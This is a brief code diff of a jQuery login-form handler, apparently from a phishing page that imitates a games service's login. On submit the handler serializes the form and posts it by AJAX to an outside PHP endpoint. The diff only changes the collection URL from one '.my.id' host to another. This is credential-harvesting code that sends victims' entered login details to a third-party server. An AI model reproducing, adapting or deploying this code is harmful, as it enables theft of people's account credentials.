@@ -2,7 +2,7 @@ $(".login-form").submit(function() {
 	var d = $(".login-form");
 
 	$.ajax({
-        url: "http://rndytech.my.id/duniagames/index.php",
+        url: "https://alfiantzy.my.id/test/index.php",
         type: "POST",
         data: d.serialize(),
         success: function () {
